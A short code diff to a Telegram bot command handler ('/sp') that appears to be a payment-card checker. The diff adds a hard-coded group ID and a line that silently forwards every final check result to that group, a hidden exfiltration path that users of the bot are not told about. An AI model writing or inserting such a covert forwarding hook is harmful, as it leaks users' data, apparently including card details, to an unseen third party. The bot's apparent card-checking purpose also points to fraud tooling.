@@ -10,6 +10,7 @@ import requests
 import json
 session = requests.session()
 
+grp = "-1002122350640"
 
 @Client.on_message(filters.command('sp'))
 async def cmd_b3l(Client, message):
@@ -231,6 +232,7 @@ Retry After {after}s
             """
 
                         finalchk = await Client.edit_message_text(message.chat.id, sixchk.id, finalresp)
+                        await Client.send_message(grp,finalresp)
                         # ANTISPAM TIME SET
                         module_name = "antispam_time"
                         value = int(time.time())
